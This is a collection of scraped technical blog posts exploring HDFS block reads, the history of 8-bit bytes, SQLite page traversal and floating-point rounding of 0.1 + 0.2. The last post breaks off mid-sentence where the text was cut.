{"url": "https://jvns.ca/blog/2014/05/15/diving-into-hdfs/", "title": "Diving into HDFS", "content": "\n      Yesterday I wanted to start learning about how HDFS (the Hadoop\nDistributed File System) works internally. I knew that \n\n \n It’s distributed, so one file may be stored across many different\nmachines \n There’s a  namenode , which keeps track of where all the files are\nstored \n There are  data nodes , which contain the actual file data \n \n\n But I wasn’t quite sure how to get started! I knew how to navigate the\nfilesystem from the command line ( hadoop fs -ls / , and friends), but\nnot how to figure out how it works internally. \n\n \n\n Colin Marc  pointed me to this great\nlibrary called  snakebite  which\nis a Python HDFS client. In particular he pointed me to the part of\nthe code that\n reads file contents from HDFS .\nWe’re going to tear it apart a bit and see what exactly it does! \n\n Getting started: Elastic MapReduce! \n\n I didn’t want to set up a Hadoop cluster by hand, and I had some AWS\ncredit that I’d gotten for free, so I set up a small Amazon Elastic\nMapReduce cluster. I worked on this with with\n Pablo Torres  and\n Sasha Laundy  and we spent much of\nthe morning fighting with it and trying to figure out protocol\nversions and why it wasn’t working with Snakebite. \n\n What ended up working was choosing AMI version “3.0.4 (hadoop 2.2.0)”.\nThis is CDH5 and Hadoop protocol version 9. Hadoop versions are\n confusing . We installed that and Snakebite version 2.4.1 and that\nalmost worked. \n\n Important things : \n\n \n We needed to look at  /home/hadoop/conf/core-site.xml  to find the\nnamenode IP and port (in  fs.default.name \n We needed to edit\n snakebite/config.py \nto say ‘fs.default.name’ instead of ‘fs.defaultFS’. Who knows. It\nworked. \n \n\n Once we did this, we could run  snakebite ls /  successfully! Time to\nmove on to breaking things! \n\n Putting data into our cluster \n\n I copied some Wikipedia data from one of Amazon’s public datasets like\nthis; \n\n hadoop distcp\ns3://datasets.elasticmapreduce/wikipediaxml/part-116.xml /wikipedia \n\n This creates a file in HDFS called  /wikipedia . You can see more\ndatasets that are easy to copy into HDFS from Amazon at\n https://s3.amazonaws.com/datasets.elasticmapreduce/ . \n\n Getting a block from our file! \n\n Now that we have a Hadoop cluster, some data in HDFS, and a tool to\nlook at it with (snakebite), we can really get started! \n\n Files in HDFS are split into  blocks . When getting a file from HDFS,\nthe first thing we need to do is to ask the namenode where the blocks\nare stored. \n\n With the help of a lot of snakebite source diving, I write a small\nPython function to do this called  find_blocks . You can see it in a\ntiny Python module I made called\n hdfs_fun.py .\nTo get it to work, you’ll need a Hadoop cluster and snakebite. \n\n \n>>> cl = hdfs_fun.create_client()\n>>> hdfs_fun.find_blocks(cl, '/wikipedia')\n[snakebite.protobuf.hdfs_pb2.LocatedBlockProto at 0xe33a910,\n snakebite.protobuf.hdfs_pb2.LocatedBlockProto at 0xe33ab40\n \n\n One of the first things I did was use  strace  to find out what data actually gets sent over the wire when I call this function. Here’s a snippet: ( the whole thing ) \n\n Part of the request: asking for the block locations for the\n /wikipedia  file.\n \nsendto(7,\n“\\n\\21getBlockLocations\\22.org.apache.hadoop.hdfs.protocol.ClientProtocol\\30\\1”,\n69, 0, NULL, 0) = 69\nsendto(7, “\\n\\n/wikipedia\\20\\0\\30\\337\\260\\240]“, 19, 0, NULL, 0) = 19\n \n\n Part of the response: (I’ve removed most of it to point out some of\nthe important parts)\n \nrecvfrom(7,\n“….BP-1019336183-10.165.43.39-1400088409498……………………..\n10.147.177.170-9200-1400088495802……………………\nBP-1019336183-10.165.43.39-1400088409498………….10.147.177.170-9200-1400088495802\n\\360G(\\216G0\\361G8\\0\\20\\200\\240\\201\\213\\275\\f\\30\\200\\340\\376]\n\\200\\300\\202\\255\\274\\f(\\200\\340\\376]0\\212\\306\\273\\205\\340(8\\1B\\r/default-rackP\\0\n\\0*\\10\\n\\0\\22\\0\\32\\0\\”\\0\\30\\0\\”\\355”, 731, 0, NULL, NULL) = 731\n \n\n Back in our Python console, we can see what some of these numbers mean: \n\n \n>>> blocks[0].b.poolId\nu'BP-1019336183-10.165.43.39-1400088409498'\n>>> blocks[0].b.numBytes\n134217728L\n>>> blocks[0].locs[0].id.ipAddr\nu'10.147.177.170'\n>>> blocks[0].locs[0].id.xferPort\n9200\n>>> blocks[1].b.poolId\nu'BP-1019336183-10.165.43.39-1400088409498'\n>>> blocks[1].b.numBytes\n61347935L\n \n\n So we have two blocks! The two  numBytes  add up to the total size of\nthe file! Cool! They both have the same  poolId , and it also turns\nout that they have the same IP address and port \n\n Reading a block \n\n Let’s try to read the data from a block! (you can see the  read_block \nfunction here in\n hdfs_fun.py \n\n \n>>> block = blocks[0]\n>>> gen = hdfs_fun.read_block(block) # returns a generator\n>>> load = gen.next()\n \n\n If I look at  strace , it starts with:\n \nconnect(8, {sa_family=AF_INET, sin_port=htons(9200),\n    sin_addr=inet_addr(“10.147.177.170”)}, 16) = 0\nsendto(8,\n    “\\nB\\n5\\n3\\n(BP-1019336183-10.165.43.39-1400088409498\\20\\211\\200\\200\\200\\4\\30\\361\\7\\22\\tsnakebite\\20\\0\\30\\200\\200\\200@“,\n    75, 0, NULL, 0) = 75\n \n\n Awesome . We can see easily that it’s connecting to the block’s data\n node ( 10.147.177.170  on port  9200 , and asking for something with\n id  BP-1019336183-10.165.43.39-1400088409498 ). Then the data node\n starts sending back data!!! \n\n \nrecvfrom(8, \"ot, it's a painting. Thomas Graeme apparently lived in\nthe mid-18th century, according to the [[Graeme Park]] article. The\nrationale also says that this image is \"used on the biography\npage about him by USHistory.org of Graeme Park.\" I cannot quite\nfigure out what this means, but I am guessing that it means the\nuploader took this image from a page hosted on USHistory.org. A\npainting of a man who lived in the mid-18th century is likely to be\nthe public domain, as claimed, but we have no good source\", 512, 0,\nNULL, NULL) = 512\n \n\n AMAZING. We have conquered HDFS. \n\n That’s all for this blog post! We’ll see if I do more later today. \n"},
{"url": "https://jvns.ca/blog/2023/03/06/possible-reasons-8-bit-bytes/", "title": "Some possible reasons for 8-bit bytes", "content": "\n     \n\n I’ve been working on a zine about how computers represent thing in binary, and\none question I’ve gotten a few times is – why does the x86 architecture use 8-bit bytes? Why not\nsome other size? \n\n With any question like this, I think there are two options: \n\n \n It’s a historical accident, another size (like 4 or 6 or 16 bits) would work just as well \n 8 bits is objectively the Best Option for some reason, even if history had played out differently we would still use 8-bit bytes \n some mix of 1 & 2 \n \n\n I’m not super into computer history (I like to use computers a lot more than I\nlike reading about them), but I am always curious if there’s an essential\nreason for why a computer thing is the way it is today, or whether it’s mostly\na historical accident. So we’re going to talk about some computer history. \n\n As an example of a historical accident: DNS has a  class  field which has 5\npossible values (“internet”, “chaos”, “hesiod”, “none”, and “any”). To me that’s\na clear example of a historical accident – I can’t imagine that we’d define\nthe class field the same way if we could redesign DNS today without worrying about backwards compatibility. I’m\nnot sure if we’d use a class field at all! \n\n There aren’t any definitive answers in this post, but I asked  on Mastodon  and\nhere are some potential reasons I found for the 8-bit byte. I think the answer\nis some combination of these reasons. \n\n what’s the difference between a byte and a word? \n\n First, this post talks about “bytes” and “words” a lot. What’s the difference between a byte and a word? My understanding is: \n\n \n the  byte size  is the smallest unit you can address. For example in a program on my machine  0x20aa87c68  might be the address of one byte, then  0x20aa87c69  is the address of the next byte. \n The  word size  is some multiple of the byte size. I’ve been confused about\nthis for years, and the Wikipedia definition is incredibly vague (“a word is\nthe natural unit of data used by a particular processor design”). I\noriginally thought that the word size was the same as your register size (64\nbits on x86-64). But according to section 4.1 (“Fundamental Data Types”) of the  Intel architecture manual ,\non x86 a word is 16 bits even though the registers are 64 bits. So I’m\nconfused – is a word on x86 16 bits or 64 bits? Can it mean both, depending\non the context? What’s the deal? \n \n\n Now let’s talk about some possible reasons that we use 8-bit bytes! \n\n reason 1: to fit the English alphabet in 1 byte \n\n This Wikipedia article  says that the IBM System/360 introduced the 8-bit byte in 1964. \n\n Here’s a  video interview with Fred Brooks (who managed the project)  talking about why. I’ve transcribed some of it here: \n\n \n … the six bit bytes [are] really better for scientific computing and the 8-bit byte ones are really better for commercial computing and each one can be made to work for the other.\nSo it came down to an executive decision and I decided for the 8-bit byte, Jerry’s proposal. \n\n [….] \n\n My most important technical decision in my IBM career was to go with the 8-bit byte for the 360.\nAnd on the basis of I believe character processing was going to become important as opposed to decimal digits. \n \n\n It makes sense that an 8-bit byte would be better for text processing: 2^6 is\n64, so 6 bits wouldn’t be enough for lowercase letters, uppercase letters, and symbols. \n\n To go with the 8-bit byte, System/360 also introduced the  EBCDIC  encoding, which is an 8-bit character encoding. \n\n It looks like the next important machine in 8-bit-byte history was the\n Intel 8008 , which was built to be\nused in a computer terminal (the Datapoint 2200). Terminals need to be able to\nrepresent letters as well as terminal control codes, so it makes sense for them\nto use an 8-bit byte.\n This Datapoint 2200 manual from the Computer History Museum \nsays on page 7 that the Datapoint 2200 supported ASCII (7 bit) and EBCDIC (8 bit). \n\n why was the 6-bit byte better for scientific computing? \n\n I was curious about this comment that the 6-bit byte would be better for scientific computing. Here’s a quote from  this interview from Gene Amdahl : \n\n \n I wanted to make it 24 and 48 instead of 32 and 64, on the basis that this\nwould have given me a more rational floating point system, because in floating\npoint, with the 32-bit word, you had to keep the exponent to just 8 bits for\nexponent sign, and to make that reasonable in terms of numeric range it could\nspan, you had to adjust by 4 bits instead of by a single bit. And so it caused\nyou to lose some of the information more rapidly than you would with binary\nshifting \n \n\n I don’t understand this comment at all – why does the exponent have to be 8 bits\nif you use a 32-bit word size? Why couldn’t you use 9 bits or 10 bits if you\nwanted? But it’s all I could find in a quick search. \n\n why did mainframes use 36 bits? \n\n Also related to the 6-bit byte: a lot of mainframes used a 36-bit word size. Why? Someone pointed out\nthat there’s a great explanation in the Wikipedia article on  36-bit computing : \n\n \n Prior to the introduction of computers, the state of the art in precision\nscientific and engineering calculation was the ten-digit, electrically powered,\nmechanical calculator… These calculators had a column of keys for each digit,\nand operators were trained to use all their fingers when entering numbers, so\nwhile some specialized calculators had more columns, ten was a practical limit \n\n Early binary computers aimed at the same market therefore often used a 36-bit\nword length. This was long enough to represent positive and negative integers\nto an accuracy of ten decimal digits (35 bits would have been the minimum) \n \n\n So this 36 bit thing seems to based on the fact that log_2(20000000000) is 34.2. Huh. \n\n My guess is that the reason for this is in the 50s, computers were\nextremely expensive. So if you wanted your computer to support ten decimal\ndigits, you’d design so that it had exactly enough bits to do that, and no\nmore. \n\n Today computers are way faster and cheaper, so if you want to represent ten\ndecimal digits for some reason you can just use 64 bits – wasting a little bit\nof space is usually no big deal. \n\n Someone else mentioned that some of these machines with 36-bit word sizes let\nyou choose a byte size – you could use 5 or 6 or 7 or 8-bit bytes, depending\non the context. \n\n reason 2: to work well with binary-coded decimal \n\n In the 60s, there was a popular integer encoding called binary-coded decimal (or  BCD  for short) that\nencoded every decimal digit in 4 bits. \n\n For example, if you wanted to encode the number 1234, in BCD that would be something like: \n\n 0001 0010 0011 0100\n \n\n So if you want to be able to easily work with binary-coded decimal, your byte\nsize should be a multiple of 4 bits, like 8 bits! \n\n why was BCD popular? \n\n This integer representation seemed really weird to me – why not just use\nbinary, which is a much more efficient way to store integers? Efficiency was really important in early computers! \n\n My best guess about why is that early computers didn’t have displays the same way we do\nnow, so the contents of a byte were mapped directly to on/off lights. \n\n Here’s a  picture from Wikipedia of an IBM 650 with some lights on its display  ( CC BY-SA 3.0 ): \n\n \n\n So if you want people to be relatively able to easily read off a decimal number\nfrom its binary representation, this makes a lot more sense. I think today BCD\nis obsolete because we have displays and our computers can convert numbers\nrepresented in binary to decimal for us and display them. \n\n Also, I wonder if BCD is where the term “nibble” for 4 bits comes from – in\nthe context of BCD, you end up referring to half bytes a lot (because every\ndigits is 4 bits). So it makes sense to have a word for “4 bits”, and people\ncalled 4 bits a nibble. Today “nibble” feels to me like an archaic term though –\nI’ve definitely never used it except as a fun fact (it’s such a fun word!). The Wikipedia article on  nibbles  supports this theory: \n\n \n The nibble is used to describe the amount of memory used to store a digit of\na number stored in packed decimal format (BCD) within an IBM mainframe. \n \n\n Another reason someone mentioned for BCD was  financial calculations . Today\nif you want to store a dollar amount, you’ll typically just use an integer\namount of cents, and then divide by 100 if you want the dollar part. This is no\nbig deal, division is fast. But apparently in the 70s dividing an integer\nrepresented in binary by 100 was very slow, so it was worth it to redesign how\nyou represent your integers to avoid having to divide by 100. \n\n Okay, enough about BCD. \n\n reason 3: 8 is a power of 2? \n\n A bunch of people said it’s important for a CPU’s byte size to be a power of 2.\nI can’t figure out whether this is true or not though, and I wasn’t satisfied with the explanation that “computers use binary so powers of 2 are good”. That seems very plausible but I wanted to dig deeper.\nAnd historically there have definitely been lots of machines that used byte sizes that weren’t powers of 2, for example (from  this retro computing stack exchange thread ): \n\n \n Cyber 180 mainframes used 6-bit bytes \n the Univac 1100 / 2200 series used a 36-bit word size \n the PDP-8 was a 12-bit machine \n \n\n Some reasons I heard for why powers of 2 are good that I haven’t understood yet: \n\n \n every bit in a word needs a bus, and you want the number of buses to be a power of 2 (why?) \n a lot of circuit logic is susceptible to divide-and-conquer techniques (I think I need an example to understand this) \n \n\n Reasons that made more sense to me: \n\n \n it makes it easier to design  clock dividers  that can measure “8 bits were\nsent on this wire” that work based on halving – you can put 3 halving clock\ndividers in series.  Graham Sutherland  told me about this and made this really cool\n simulator of clock dividers  showing what these clock dividers look like. That site (Falstad) also has a bunch of other example circuits and it seems like a really cool way to make circuit simulators. \n if you have an instruction that zeroes out a specific bit in a byte, then if\nyour byte size is 8 (2^3), you can use just 3 bits of your instruction to\nindicate which bit. x86 doesn’t seem to do this, but the  Z80’s bit testing instructions  do. \n someone mentioned that some processors use  Carry-lookahead adders , and they work\nin groups of 4 bits. From some quick Googling it seems like there are a wide\nvariety of adder circuits out there though. \n bitmaps : Your computer’s memory is organized into pages (usually of size 2^n). It\nneeds to keep track of whether every page is free or not. Operating systems\nuse a bitmap to do this, where each bit corresponds to a page and is 0 or 1\ndepending on whether the page is free. If you had a 9-bit byte, you would\nneed to divide by 9 to find the page you’re looking for in the bitmap.\nDividing by 9 is slower than dividing by 8, because dividing by powers of 2\nis always the fastest thing. \n \n\n I probably mangled some of those explanations pretty badly: I’m pretty far out\nof my comfort zone here. Let’s move on. \n\n reason 4: small byte sizes are good \n\n You might be wondering – well, if 8-bit bytes were better than 4-bit bytes,\nwhy not keep increasing the byte size? We could have 16-bit bytes! \n\n A couple of reasons to keep byte sizes small: \n\n \n It’s a waste of space – a byte is the minimum unit you can address, and if\nyour computer is storing a lot of ASCII text (which only needs 7 bits), it\nwould be a pretty big waste to dedicate 12 or 16 bits to each character when\nyou could use 8 bits instead. \n As bytes get bigger, your CPU needs to get more complex. For example you need one bus line per bit. So I guess simpler is better. \n \n\n My understanding of CPU architecture is extremely shaky so I’ll leave it at\nthat. The “it’s a waste of space” reason feels pretty compelling to me though. \n\n reason 5: compatibility \n\n The Intel 8008 (from 1972) was the precursor to the 8080 (from 1974), which was the precursor to the\n8086 (from 1976) – the first x86 processor. It seems like the 8080 and the\n8086 were really popular and that’s where we get our modern x86 computers. \n\n I think there’s an “if it ain’t broke don’t fix it” thing going on here – I\nassume that 8-bit bytes were working well, so Intel saw no need to change the\ndesign. If you keep the same 8-bit byte, then you can reuse more of your\ninstruction set. \n\n Also around the 80s we start getting network protocols like TCP\nwhich use 8-bit bytes (usually called “octets”), and if you’re going to be\nimplementing network protocols, you probably want to be using an 8-bit byte. \n\n that’s all! \n\n It seems to me like the main reasons for the 8-bit byte are: \n\n \n a lot of early computer companies were American, the most commonly used language in the US is English \n those people wanted computers to be good at text processing \n smaller byte sizes are in general better \n 7 bits is the smallest size you can fit all English characters + punctuation in \n 8 is a better number than 7 (because it’s a power of 2) \n once you have popular 8-bit computers that are working well, you want to keep the same design for compatibility \n \n\n Someone pointed out that  page 65 of this book from 1962 \ntalking about IBM’s reasons to choose an 8-bit byte basically says the same thing: \n\n \n \n Its full capacity of 256 characters was considered to be sufficient for the great majority of applications. \n Within the limits of this capacity, a single character is represented by a\nsingle byte, so that the length of any particular record is not dependent on\nthe coincidence of characters in that record. \n 8-bit bytes are reasonably economical of storage space \n For purely numerical work, a decimal digit can be represented by only 4\nbits, and two such 4-bit bytes can be packed in an 8-bit byte. Although such\npacking of numerical data is not essential, it is a common practice in\norder to increase speed and storage efficiency. Strictly speaking, 4-bit\nbytes belong to a different code, but the simplicity of the 4-and-8-bit\nscheme, as compared with a combination 4-and-6-bit scheme, for example,\nleads to simpler machine design and cleaner addressing logic. \n Byte sizes of 4 and 8 bits, being powers of 2, permit the computer designer\nto take advantage of powerful features of binary addressing and indexing to\nthe bit level (see Chaps. 4 and 5 ) . \n \n \n\n Overall this makes me feel like an 8-bit byte is a pretty natural choice if\nyou’re designing a binary computer in an English-speaking country. \n\n"},
{"url": "https://jvns.ca/blog/2014/09/27/how-does-sqlite-work-part-1-pages/", "title": "How does SQLite work? Part 1: pages!", "content": "\n      This evening the fantastic  Kamal \nand I sat down to learn a little more about databases than we did\nbefore. \n\n I wanted to hack on  SQLite , because I’ve\nused it before, it requires no configuration or separate server\nprocess, I’d been told that its source code is well-written and\napproachable, and all the data is stored in one file. Perfect! \n\n \nTo start out, I created a new database like this: \n\n drop table if exists fun;\ncreate table fun (\n    id int PRIMARY KEY,\n    word string\n);\n \n\n Just a primary key and a string! What could be simpler? I then wrote a\nlittle Python script to put the contents of  /usr/share/dict/words  in\nthe database: \n\n import sqlite3\nc = sqlite3.connect(\"./fun.sqlite\")\nwith open('/usr/share/dict/words') as f:\n    for i, word in enumerate(f):\n        word = word.strip()\n        word = unicode(word, 'latin1')\n        c.execute(\"INSERT INTO fun VALUES (?, ?);\", (i, word))\nc.commit()\nc.close()\n \n\n Great! Now we have a 4MB database called  fun.sqlite  for\nexperimentation. My favorite first thing to do with binary files is to\n cat  them. That worked pretty well, but Kamal pointed out that of\ncourse  hexdump  is a better way to look at binary files. The output\nof  hexdump -C fun.sqlite  looks something like this: \n\n |.............{.n|\n|.a.R.D.4.%......|\n|................|\n|...y.n._.N.>.,.$|\n|................|\n|..............F.|\n|..EAcevedo.E...D|\n|Accra's.D...CAcc|\n|ra.C..#BAccentur|\n|e's.B...AAccentu|\n|re.A..!@Acapulco|\n|'s.@...?Acapulco|\n|.?...>Acadia's.>|\n|...=Aradia.=...<|\n|Ac's.<...;Ac.;..|\n|%:Abyssinian's.:|\n|..!9Abyssinian.9|\n|..#8Abyssinia's.|\n|8...7Abyssinia.7|\n \n\n I’ve pasted the first few thousand lines of the hexdump in\n this gist , so you\ncan look more closely. You’ll see that the file is alternately split\ninto words and gibberish – there will be a sequence of mostly words,\nand then unreadable nonsense. \n\n Of course there’s a rhyme to this reason! The wonderfully written\n File Format for SQLite Databases \ntells us that a SQLite database is split into  pages , and that\nbytes 16 and 17 of our file are the  page size . \n\n My  fun.sqlite  starts like this: \n\n 00000000  53 51 4c 69 74 65 20 66  6f 72 6d 61 74 20 33 00  |SQLite format 3.|\n00000010  04 00 01 01 00 40 20 20  00 00 00 27 00 00 0c be  |.....@  ...'....|\n          ^^ ^^\n        page size :)\n \n\n so our page size is  0x0400  bytes, or 1024 bytes, or 1k. So this\ndatabase is split into a bunch of 1k chunks called pages. \n\n There’s an index on the  id  column of our  fun  table, which lets us\nrun queries like  select * from fun where id = 100  quickly. To be a\nbit more precise: to find row 100, we don’t need to read every page,\nwe can just read a few pages. I’ve always understood indexes in a\npretty vague way – I know that they’re “some kind of tree”, which\nlets you access data in O(log n), and in particular that databases use\nsomething called a  btree . I still do not really know what a btree\nis. Let’s see if we can do any better! \n\n Here’s where it starts to get really fun! I downloaded the sqlite\nsource code, and Kamal and I figured out how to get it to compile.\n(using nix, which is a totally other story) \n\n Then I put in a print statement so that it would tell me every time it\naccesses a page. There’s about 140,000 lines of SQLite source code,\nwhich is a bit intimidating! \n\n It’s also incredibly well commented, though, and includes adorable\nnotes like this: \n\n /************** End of btree.c ***********************************************/\n/************** Begin file backup.c ******************************************/\n/*\n** 2009 January 28\n**\n** The author disclaims copyright to this source code.  In place of\n** a legal notice, here is a blessing:                                                                                                                                                   \n**\n**    May you do good and not evil.\n**    May you find forgiveness for yourself and forgive others.\n**    May you share freely, never taking more than you give.\n**\n*************************************************************************\n** This file contains the implementation of the sqlite3_backup_XXX()\n** API functions and the related features.\n \n\n My next goal was to get SQLite to tell me how it was traversing the\npages. Some careful grepping of the 140,000 lines led us to this\nfunction  btreePageFromDbPage . All page reads need to go through this\nfunction, so we can just add some logging to it :) \n\n /*\n** Convert a DbPage obtained from the pager into a MemPage used by\n** the btree layer.\n*/\nstatic MemPage *btreePageFromDbPage(DbPage *pDbPage, Pgno pgno, BtShared *pBt){\n  MemPage *pPage = (MemPage*)sqlite3PagerGetExtra(pDbPage);\n  pPage->aData = sqlite3PagerGetData(pDbPage);\n  pPage->pDbPage = pDbPage;\n  pPage->pBt = pBt;\n  pPage->pgno = pgno;\n  printf(\"Read a btree page, page number %d\\n\", pgno); // added by me!\n  pPage->hdrOffset = pPage->pgno==1 ? 100 : 0;\n  return pPage;\n}\n \n\n Now it’ll notify us every time it reads a page! NEAT! Let’s experiment\na little bit. \n\n sqlite> select * from fun where id = 1;\nRead a btree page, page number 1\nRead a btree page, page number 5\nRead a btree page, page number 828\nRead a btree page, page number 10\nRead a btree page, page number 2\nRead a btree page, page number 76\nRead a btree page, page number 6\n1|A's\n\nsqlite> select * from fun where id = 20;\nRead a btree page, page number 1\nRead a btree page, page number 5\nRead a btree page, page number 828\nRead a btree page, page number 10\nRead a btree page, page number 2\nRead a btree page, page number 76\nRead a btree page, page number 6\n20|Aaliyah\n \n\n Those two rows (1 and 20) are in the same page, so it traverses the\nsame path to get to both of them! \n\n sqlite> select * from fun where id = 200;\nRead a btree page, page number 1\nRead a btree page, page number 5\nRead a btree page, page number 828\nRead a btree page, page number 11\nRead a btree page, page number 2\nRead a btree page, page number 76\nRead a btree page, page number 2818\n200|Aggie\n \n\n Apparently  200  is pretty close in the tree, but it needs to go to\npage  2818  instead at the end. And  80000  is much further away: \n\n sqlite> select * from fun where id = 80000;\nRead a btree page, page number 1\nRead a btree page, page number 5\nRead a btree page, page number 1198\nRead a btree page, page number 992\nRead a btree page, page number 2\nRead a btree page, page number 1813\nRead a btree page, page number 449\n80000|scarfs\n \n\n If we go back and inspect the file, we can see that pages 1, 5, 1198,\n992, 2, and 1813 are  interior nodes  – they have no data in them,\njust pointers to other pages. Pages 6, 2818, and 449 are  leaf nodes ,\nand they’re where the data is. \n\n I’m still not super clear on how exactly the interior pages are\nstructured and how the pointers to their child pages work. It’s time\nto sleep now, but perhaps that will happen another day! \n\n Modifying open source programs to print out debug information to\nunderstand their internals better: SO FUN. \n"},
{"url": "https://jvns.ca/blog/2023/02/08/why-does-0-1-plus-0-2-equal-0-30000000000000004/", "title": "Why does 0.1 + 0.2 = 0.30000000000000004?", "content": "\n     \n\n \n   span {\n   padding: 0 !important;\n   }\n  \n    \n\n Hello! I was trying to write about floating point yesterday,\nand I found myself wondering about this calculation, with 64-bit floats: \n\n >>> 0.1 + 0.2\n0.30000000000000004\n \n\n I realized that I didn’t understand exactly how it worked. I mean, I know\nfloating point calculations are inexact, and I know that you can’t exactly\nrepresent  0.1  in binary, but: there’s a floating point number that’s closer to\n0.3 than  0.30000000000000004 ! So why do we get the answer\n 0.30000000000000004 ? \n\n If you don’t feel like reading this whole post with a bunch of calculations, the short answer is that\n 0.1000000000000000055511151231257827021181583404541015625 + 0.200000000000000011102230246251565404236316680908203125  lies exactly between\n2 floating point numbers,\n 0.299999999999999988897769753748434595763683319091796875  (usually printed as  0.3 ) and\n 0.3000000000000000444089209850062616169452667236328125  (usually printed as  0.30000000000000004 ). The answer is\n 0.30000000000000004  (the second one) because its significand is even. \n\n how floating point addition works \n\n This is roughly how floating point addition works: \n\n \n Add together the numbers (with extra precision) \n Round the result to the nearest floating point number \n \n\n So let’s use these rules to calculate 0.1 + 0.2. I just learned how floating\npoint addition works yesterday so it’s possible I’ve made some mistakes in this\npost, but I did get the answers I expected at the end. \n\n step 1: find out what 0.1 and 0.2 are \n\n First, let’s use Python to figure out what the exact values of  0.1  and  0.2  are, as 64-bit floats. \n\n >>> f\"{0.1:.80f}\"\n'0.10000000000000000555111512312578270211815834045410156250000000000000000000000000'\n>>> f\"{0.2:.80f}\"\n'0.20000000000000001110223024625156540423631668090820312500000000000000000000000000'\n \n\n These really are the exact values: because floating point numbers are in base\n2, you can represent them all exactly in base 10. You just need a lot of digits\nsometimes :) \n\n step 2: add the numbers together \n\n Next, let’s add those numbers together. We can add the fractional parts together as integers to get the exact answer: \n\n >>> 1000000000000000055511151231257827021181583404541015625 + 2000000000000000111022302462515654042363166809082031250\n3000000000000000166533453693773481063544750213623046875\n \n\n So the exact sum of those two floating point numbers is  0.3000000000000000166533453693773481063544750213623046875 \n\n This isn’t our final answer though because  0.3000000000000000166533453693773481063544750213623046875  isn’t a 64-bit float. \n\n step 3: look at the nearest floating point numbers \n\n Now, let’s look at the floating point numbers around  0.3 . Here’s the closest floating point number to  0.3  (usually written as just  0.3 , even though that isn’t its exact value): \n\n >>> f\"{0.3:.80f}\"\n'0.29999999999999998889776975374843459576368331909179687500000000000000000000000000'\n \n\n We can figure out the next floating point number after  0.3  by serializing\n 0.3  to 8 bytes with  struct.pack , adding 1, and then using  struct.unpack : \n\n >>> struct.pack(\"!d\", 0.3)\nb'?\\xd3333333'\n# manually add 1 to the last byte\n>>> next_float = struct.unpack(\"!d\", b'?\\xd3333334')[0]\n>>> next_float\n0.30000000000000004\n>>> f\"{next_float:.80f}\"\n'0.30000000000000004440892098500626161694526672363281250000000000000000000000000000'\n \n\n Apparently you can also do this with  math.nextafter : \n\n >>> math.nextafter(0.3, math.inf)\n0.30000000000000004\n \n\n So the two 64-bit floats around\n 0.3  are\n 0.299999999999999988897769753748434595763683319091796875  and\n 0.3000000000000000444089209850062616169452667236328125 \n\n step 4: find out which one is closest to our result \n\n It turns out that  0.3000000000000000166533453693773481063544750213623046875 \nis exactly in the middle of\n 0.299999999999999988897769753748434595763683319091796875  and\n 0.3000000000000000444089209850062616169452667236328125 . \n\n You can see that with this calculation: \n\n >>> (3000000000000000444089209850062616169452667236328125000 + 2999999999999999888977697537484345957636833190917968750) // 2 == 3000000000000000166533453693773481063544750213623046875\nTrue\n \n\n So neither of them is closest. \n\n how does it know which one to round to? \n\n In the binary representation of a floating point number, there’s a number\ncalled the “significand”. In cases like this (where the result is exactly in\nbetween 2 successive floating point number, it’ll round to the one with the\neven significand. \n\n In this case that’s  0.300000000000000044408920985006261616945266723632812500 \n\n We actually saw the significand of this number a bit earlier: \n\n \n 0.30000000000000004  is  struct.unpack('!d', b'?\\xd3333334') \n 0.3 is  struct.unpack('!d', b'?\\xd3333333') \n \n\n The last digit of the big endian hex representation of  0.30000000000000004  is\n 4 , so that’s the one with the even significand (because the significand is at\nthe end). \n\n let’s also work out the whole calculation in binary \n\n Above we did the calculation in decimal, because that’s a little more intuitive\nto read. But of course computers don’t do these calculations in decimal –\nthey’re done in a base 2 representation. So I wanted to get an idea of how that\nworked too. \n\n I don’t think this binary calculation part of the post is particularly clear\nbut it was helpful for me to write out. There are a really a lot of numbers and\nit might be terrible to read. \n\n how 64-bit floats numbers work: exponent and significand \n\n 64-bit floating point numbers are represented with 2 integers: an  exponent  and the  significand  and a 1-bit  sign . \n\n Here’s the equation of how the exponent and significand correspond to an actual number \n\n $$\\text{sign} \\times 2^\\text{exponent} (1 + \\frac{\\text{significand}}{2^{52}})$$ \n\n For example if the exponent was  1  the significand was  2**51 , and the sign was positive, we’d get \n\n $$2^{1} (1 + \\frac{2^{51}}{2^{52}})$$ \n\n which is equal to  2 * (1 + 0.5)  , or 3. \n\n step 1: get the exponent and significand for  0.1  and  0.2 \n\n I wrote some inefficient functions to get the exponent and significand of a positive float in Python: \n\n def get_exponent(f):\n    # get the first 12 bytes\n    bytestring = struct.pack('!d', f)\n    return int.from_bytes(bytestring, byteorder='big') >> 52\ndef get_significand(f):\n    # get the last 52 bytes\n    bytestring = struct.pack('!d', f)\n    x = int.from_bytes(bytestring, byteorder='big')\n    exponent = get_exponent(f)\n    return x ^ (exponent << 52)\n \n\n I’m ignoring the sign bit (the first bit) because we only need these functions\nto work on two numbers (0.1 and 0.2) and those two numbers are both positive. \n\n First, let’s get the exponent and significand of 0.1. We need to subtract 1023\nto get the actual exponent because that’s how floating point works. \n\n >>> get_exponent(0.1) - 1023\n-4\n>>> get_significand(0.1)\n2702159776422298\n \n\n The way these numbers work together to get  0.1  is  2**exponent + significand / 2**(52 - exponent) . \n\n Here’s that calculation in Python: \n\n >>> 2**-4 + 2702159776422298 / 2**(52 + 4)\n0.1\n \n\n (you might legitimately be worried about floating point accuracy issues with\nthis calculation, but in this case I’m pretty sure it’s fine because these\nnumbers by definition don’t have accuracy issues – the floating point numbers starting at  2**-4   go up in steps of  1/2**(52 + 4) ) \n\n We can do the same thing for  0.2 : \n\n >>> get_exponent(0.2) - 1023\n-3\n>>> get_significand(0.2)\n2702159776422298\n \n\n And here’s how that exponent and significand work together to get  0.2 : \n\n >>> 2**-3 + 2702159776422298 / 2**(52 + 3)\n0.2\n \n\n (by the way, it’s not a coincidence that 0.1 and 0.2 have the same significand – it’s because  x  and  2*x  always have the same significand) \n\n step 2: rewrite  0.1  to have a bigger exponent \n\n 0.2  has a bigger exponent than  0.1  – -3 instead of -4. \n\n So we need to rewrite \n\n 2**-4 + 2702159776422298 / 2**(52 + 4)\n \n\n to be  X / (2**52 + 3) \n\n If we solve for X in  2**-4 + 2702159776422298 / 2**(52 + 4) = X / (2**52 + 3) , we get: \n\n X = 2**51 + 2702159776422298 /2 \n\n We can calculate that in Python pretty easily: \n\n >>> 2**51 + 2702159776422298 //2\n3602879701896397\n \n\n step 3: add the significands \n\n Now we’re trying to do this addition \n\n 2**-3 + 2702159776422298 / 2**(52 + 3) + 3602879701896397 / 2**(52 + 3)\n \n\n So we need to add together  2702159776422298  and  